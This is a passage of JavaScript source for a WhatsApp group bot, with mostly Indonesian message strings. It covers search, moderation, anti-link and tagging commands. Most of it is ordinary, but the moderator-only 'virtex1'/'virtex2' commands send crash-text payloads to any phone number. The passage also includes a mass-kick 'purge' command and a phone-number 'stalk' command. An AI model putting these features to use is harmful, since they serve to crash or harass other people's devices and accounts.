reply(mess.waiting)
await fetchJson(`https://api.jikan.moe/v4/anime?q=${q}`)
.then((res) =>{
console.log(res)   
let sections = []   
  for (let i of res.data) {
  const list = {title: `${i.title}`,
  rows: [
	    {
	     title: `${i.title}\n\n`, 
	     rowId: `${prefix}animesearch ${i.mal_id}`,
	     description: `${i.synopsis}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  Miku.sendMessage(
      from, 
      {
       text: "Anime Search",
       footer: BotName,
       title: OwnerName,
       buttonText: "Search Results",
       sections
      }, { quoted : m }
    )  
})
}
  break





 case 'emoji': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args.join(" ")) return reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Miku.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Here it is...`}, {quoted:m})
await Miku.sendMessage(from, {text:"reply -s to this image to make sticker"}, {quoted:mese})
})
}
break

 case 'listpc': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
 let teks = ` 「  Isi Chat Miuna  」\n\nTotal ${anu.length} Orang yang ngechat Miuna.`
 for (let i of anu) {
  teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`
 }
 Miku.sendTextWithMentions(m.chat, teks, m)
 }
 break

 case 'listgc': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = ` 「  List Grup Miuna  」\n\nTotal ada ${anu.length} Grup yang menggunakan Miuna.`
 for (let i of anu) {
  let metadata = await Miku.groupMetadata(i)
  if (metadata.owner === "undefined") {
  loldd = false
  } else {
  loldd = metadata.owner
  }
  teks += `\n\nNama Grup : ${metadata.subject ? metadata.subject : "undefined"}\nAdmin : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\ntanggal grup dibuat : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nAnggota : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
 }
 Miku.sendTextWithMentions(m.chat, teks, m)
 }
 break

 case 'afk': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 let user = global.db.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = args.join(" ")
 replay(`${m.pushName} Sekarang lagi afk.\nAlasan AFK : ${args.join(" ") ? args.join(" ") : ''}`)
 }
 break


 case 'fliptext': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (args.length < 1) return replay(`Example:\n${prefix}fliptext ${OwnerName}`)
 quere = args.join(" ")
 flipe = quere.split('').reverse().join('')
 replay(`\`\`\`「  Text Flipper Tool  」\`\`\`\n*Input text :*\n${quere}\n*Fliped text :*\n${flipe}`)
 }
 break

 case 'toletter': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!Number(args[0])) return replay(`Example:\n${prefix}toletter 956`)
 try {
 quere = args.join(" ")
 convertes = await toHur(quere)
 replay(`\`\`\`「  Word Maker Tool  」\`\`\`\n*Input Number :*\n${quere}\n*Converted Alphabet :*\n${convertes}`)
 } catch {
 replay(`Error!`)
 }
 }

   case 'leveling':
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return reply(mess.useradmin)
 if (args.length < 1) return reply('Type on to *Enable*\nType off to *Disable*')
 if (args[0] === 'on'){
 if (isLeveling) return reply(`Already activated`)
 _leveling.push(from)
 fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
 reply('Leveling activated')
 } else if (args[0] === 'off'){
 let anu = _leveling.indexOf(from)
 _leveling.splice(anu, 1)
 fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
 reply('Leveling deactivated')
 } 
 break

 case 'antilinkgc': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLink) return replay('Already activated')
 ntilink.push(from)
 replay('Activated _Antilink_ in this group.')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLink) return replay('Already deactivated!')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
 replay('Deactivated _Antilink_ in this group!')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkgc on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkgc off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break

case 'menfess':
case 'menfes':
case 'confes':
case 'confess': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Didalam Grup!')
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer orang yang mau dikirim/nama samaran anda/pesan yang ingin disampaikan\n\nContoh ${prefix}${command} 6283169696969/ini nama samaran ya/Sebenernya aku suka sama kamu\n\nContoh 2 : ${prefix}${command} 6283169696969/Tebak siapa?/Sebenernya aku suka sama kamu!\n\nTenang aja privasi aman kok><`)
let nomor = q.split('/')[0] ? q.split('/')[0] : q
let saking = q.split('/')[1] ? q.split('/')[1] : q
let pesan = q.split('/')[2] ? q.split('/')[2] : ''
if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai kak ada Menfess nih!!\n─────────────\n*© Miuna | Ri*\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
let btutonmnfs = [{buttonId: `-menfesconfirm ${m.sender}`, buttonText: {displayText: 'Confirm Menfes'}, type: 1},
		 {buttonId: `-menfess`, buttonText: {displayText: 'Kirim Menfess'}, type: 1}
		 ]
let buntnmenfes = {
image: { url: `https://telegra.ph/file/238a9ba81c0787c3e3522.jpg`},
caption: teksnya,
footer: `Miuna`,
buttons: btutonmnfs,
headerType: 4
}
Miku.sendMessage(`${nomor}@s.whatsapp.net`, buntnmenfes, { quoted: fvn })
m.reply(`Sukses Mengirim Menfess!!`) }
break
case 'menfesconfirm': {
Miku.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess Nya Sama Si Dia🤭`})
m.reply(`Terimakasih Menfess Telah Diterima.\n\nMau kirim menfess juga? klik tombol diatas!`) }
break
		
case 'x' :
if (!isCreator) return reply (mess.mod)
if (!args.join(" ")) return reply(`Textnya tot!`) 
Miku.sendMessage(`120363027488032044@g.us`, { text : args.join(" ") ? args.join(" ") : ''},{ quoted: fdocs })
break
case 'k' : {
if (!isCreator) return reply (mess.mod)
if (!text) return reply (`textnya?`)
let nomor = q.split('/')[0] ? q.split('/')[0] : q
let pesan = q.split('/')[1] ? q.split('/')[1] : q
Miku.sendMessage(`${nomor}@s.whatsapp.net`, {text : `${pesan}`}, { quoted: fvn })
m.reply(`Wess`) 
}
break

case 'g' : {
if (!isCreator) return reply (mess.mod)
if (!text) return reply (`textnya?`)
let nomor = q.split('/')[0] ? q.split('/')[0] : q
let pesan = q.split('/')[1] ? q.split('/')[1] : q
Miku.sendMessage(`${nomor}@g.us`, {text : `${pesan}`}, { quoted: fvn })
m.reply(`Wess`) 
}
break

case 'virtex1' :
if (!isMod) return reply (mess.mod)
if (!args.join(" ")) return reply(`Nomernya Mana Bang?`) 
nye=`${virtex1}`
Miku.sendMessage(`${args.join(" ")}@s.whatsapp.net`, { text : nye },{quoted : flokasi})
reply(`Udah bang`)
break
case 'virtex2' :
if (!isMod) return reply (mess.mod)
if (!args.join(" ")) return reply(`Nomernya Mana Bang?`) 
nye=`${virtex2}`
Miku.sendMessage(`${args.join(" ")}@s.whatsapp.net`, { text : nye },{quoted : flokasi})
reply(`Wes Bang!!!`)
break

		

   case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkYoutubeVid) return replay('Already activated')
 ntilinkytvid.push(from)
 replay('Activated youtube video antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkYoutubeVid) return replay('Already deactivated')
 let off = ntilinkytvid.indexOf(from)
 ntilinkytvid.splice(off, 1)
 replay('Deactivated youtube video antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkyoutubevideo on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkyoutubevideo off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break



     case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkYoutubeChannel) return replay('Already activated')
 ntilinkytch.push(from)
 replay('Activated youtube channel antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkYoutubeChannel) return replay('Already deactivated')
 let off = ntilinkytch.indexOf(from)
 ntilinkytch.splice(off, 1)
 replay('Deactivated youtube channel antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkyoutubech on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkyoutubech off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkInstagram) return replay('Already activated')
 ntilinkig.push(from)
 replay('Activated instagram antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkInstagram) return replay('Already deactivated')
 let off = ntilinkig.indexOf(from)
 ntilinkig.splice(off, 1)
 replay('Deactivated instagram antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkinstagram on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkinstagram off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break

   case 'antilinkfacebook': case 'antilinkfb': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkFacebook) return replay('Already activated')
 ntilinkfb.push(from)
 replay('Activated facebook antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkFacebook) return replay('Already deactivated')
 let off = ntilinkfb.indexOf(from)
 ntilinkfb.splice(off, 1)
 replay('Deactivated facebook antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkfacebook on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkfacebook off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinktelegram': case 'antilinktg': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTelegram) return replay('Already activated')
 ntilinktg.push(from)
 replay('Activated telegram antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTelegram) return replay('Already deactivated')
 let off = ntilinkig.indexOf(from)
 ntilinkig.splice(off, 1)
 replay('Deactivated telegram antilink in this group')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinktelegram on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinktelegram off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinktiktok': case 'antilinktt': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTiktok) return replay('Already activated')
 ntilinktt.push(from)
 replay('Activated tiktok antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTiktok) return replay('Already deactivated')
 let off = ntilinktt.indexOf(from)
 ntilinktt.splice(off, 1)
 replay('Deactivated tiktok antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinktiktok on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinktiktok off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break

   case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTwitter) return replay('Already activated')
 ntilinktwt.push(from)
 replay('Activated twitter antilink in this group !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTwitter) return replay('Already deactivated')
 let off = ntilinktwt.indexOf(from)
 ntilinktwt.splice(off, 1)
 replay('Deactivated twitter antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinktwt on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinktwt off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinkall': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTwitter) return replay('Already activated')
 ntilinkall.push(from)
 replay('Enabled all antilink !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkAll) return replay('Already deactivated')
 let off = ntilinkall.indexOf(from)
 ntilinkall.splice(off, 1)
 replay('Disabled all antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkall on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkall off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break


   case 'antiwame': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (antiWame) return replay('Already activated')
 ntwame.push(from)
 replay('Activated antiwame !')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`*「  Warning  」*\`\`\`\n\nAntilink is enabled!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!antiWame) return replay('Already deactivated')
 let off = nttoxic.indexOf(from)
 ntwame.splice(off, 1)
 replay('Deactivated antiwame !')
 } else {
   let buttonsntwame = [
   { buttonId: `-antiwame on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antiwame off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break
 case 'gimana': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isCreator) return reply(mess.botowner)
 reply(`Gawaras anying!`)
 
 
 }
 break
 
   case 'hentai': case 'hen': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiNsfw) return replay(' *Udah dihidupin bang* ')
 ntnsfw.push(from)
 replay('_Mode *Hentai* telah diaktifkan!_')
 var groupe = await Miku.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 Miku.sendMessage(from, {text: `\`\`\`「 *PERHATIAN*! 」\`\`\`\n\n _Fitur *Hentai* telah diaktifkan, Sekarang semua member bisa akses gambar bokep kartun_ `, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiNsfw) return replay(' *Udah dimatiin bang* ')
 let off = ntnsfw.indexOf(from)
 ntnsfw.splice(off, 1)
 replay('_Mode *Hentai* sudah dimatikan!_')
 } else {
   let buttonsntnsfw = [
   { buttonId: `-hentai on`, buttonText: { displayText: 'Aktifin' }, type: 1 },
   { buttonId: `-hentai off`, buttonText: { displayText: 'Matiin' }, type: 1 }
   ]
   await Miku.sendButtonText(m.chat, buttonsntnsfw, `Silahkeun Klik tombol ini\n\nKetahuan nyari bokep loli = FBI datang kerumah`, `${global.BotName}`, m)
   }
   }
		
   break


   case 'ban': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!isCreator) return replay(mess.botowner)
if (!args[0]) return replay(`Pilih banned or Unbanned (add untuk banned, del untuk unbanned), Contoh: Balas pesan orang yg mau dibanned dengan *${prefix}ban add* .`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banUser.includes(orgnye)
if (args[0] === "add") {
if (isBane) return ads('User is already banned.')
banUser.push(orgnye)
replay(`Orang itu telah dibanned, mampos!!!.`)
} else if (args[0] === "del") {
if (!isBane) return ads('User is already unbanned.')
let delbans = banUser.indexOf(orgnye)
banUser.splice(delbans, 1)
replay(`Orang itu sudah di unbanned , jangan tengil lagi yah!.`)
} else {
replay("Error")
}
}
break


case 'listonline': case 'listaktif': case 'here':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
 let online = [...Object.keys(store.presences[id]), botNumber]
 let liston = 1
 Miku.sendText(m.chat, '  「 *Member yang lagi aktif* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break

 case 'ban': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!isCreator) return replay(mess.botowner)
if (!args[0]) return replay(`Pilih mau di banned atau Unbanned (add untuk banned, del untuk unbanned), Contoh: Balas pesan orang yg mau dibanned dengan *${prefix}ban add* `)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banUser.includes(orgnye)
if (args[0] === "add") {
if (isBane) return ads('User was already banned.')
banUser.push(orgnye)
replay(`orang itu berhasil dibanned. Mampua kau ,mampua!`)
} else if (args[0] === "del") {
if (!isBane) return ads('User was already unbanned.')
let delbans = banUser.indexOf(orgnye)
banUser.splice(delbans, 1)
replay(`Orang itu telah diunbanned, jangan tengil lagi deck!.`)
} else {
replay("Error")
}
}
break


case 'happymod': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return replay(`Example : ${prefix + command} Kinemaster`)
 yogipw.happymod(args.join(" ")).then(async(res) => {
 teks = '```「 HappyMod Search Engine 」```'
 for (let i of res) {
 teks += `\n\n${i.name}\n`
 teks += `${i.link}`
 }
 let buttons = [
 {buttonId: `-menu`, buttonText: {displayText: '✨Menu✨'}, type: 1}
 ]
 let buttonMessage = {
 image: {url:res[0].icon},
 jpegThumbnail: Thumb,
 caption: teks,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4
 }
 Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
 })
 }
 break

 case 'yts': case 'ytsearch': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return replay(`Ketik Judul tot. Contoh : -yts Asede Kontol`)
 let yts = require("yt-search")
 let search = await yts(args.join(" "))
 let teks = '```「 YouTube search Engine 」```\n\n Kata Kunci: '+text+'\n\n'
 let no = 1
 for (let i of search.all) {
 teks += `Hasil Nomer : ${no++}\n\nTitle : ${i.title}\n\nPenonton : ${i.views}\n\nDurasi : ${i.timestamp}\n\nDiupload : ${i.ago}\n\nAuthor : ${i.author.name}\n\nUrl : ${i.url}\n\n\n-----------------------------------------------------------------------------\n\n\n`
 }
 Miku.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
 }
 break

 case 'setname': case 'setsubject': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!text) return replay('Pls enter -setname <New Group Name>  to change this Group Name')
 await Miku.groupUpdateSubject(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
 }
 break

case 'block': {
    if (!isCreator) return reply(mess.botowner)
    if (isBan) return reply(mess.banned)		
    if (isBanChat) return reply(mess.bangc)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Miku.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break

case 'unblock': {
 if (!isCreator) return reply(mess.botowner)
    if (isBan) return reply(mess.banned)	 	
    if (isBanChat) return reply(mess.bangc)
    
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await Miku.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break

 case 'setdesc': case 'setdesk': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!text) return replay('Pls enter -setname <New Group Description>  to change this Group Description.')
 await Miku.groupUpdateDescription(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
 }
 break

 case 'setgrouppp': case 'setgruppp': case 'setgcpp': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!quoted) return replay(`Send/Reply Image With Caption ${prefix + command}`)
 if (!/image/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
 if (/webp/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
 let media = await Miku.downloadAndSaveMediaMessage(quoted)
 await Miku.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
 replay(mess.jobdone)
 }
 break

 
 case 'tag': case 'tagall': case 'all':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 let teks = `「 _Tag All_ 」
  
 *Message : ${args.join(" ") ? args.join(" ") : 'no message'}*\n\n`
 for (let mem of participants) {
 teks += `» @${mem.id.split('@')[0]}\n`
 }
 Miku.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
 }
 break



 case 'hidetag': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 Miku.sendMessage(m.chat, { text : args.join(" ") ? args.join(" ") : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 }
 break

case 'purge':{
    if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
const delay = time => new Promise(res=>setTimeout(res,time));
let mentioned = participants.map(v => v.jid)
      for (let member of mentioned) {     
      Miku.groupParticipantsUpdate(m.chat, [member], 'remove')
      }
    }

    break




    case 'nowa':  case 'stalk': case 'stalknumber':{
        if (isBan) return reply(mess.banned)
        if (!args[0]) return reply(`Use command like: ${prefix}stalk <number>xxx`)
        var inputnumber = args[0]
        if (!inputnumber.includes('x')) return reply('You didnot added x')
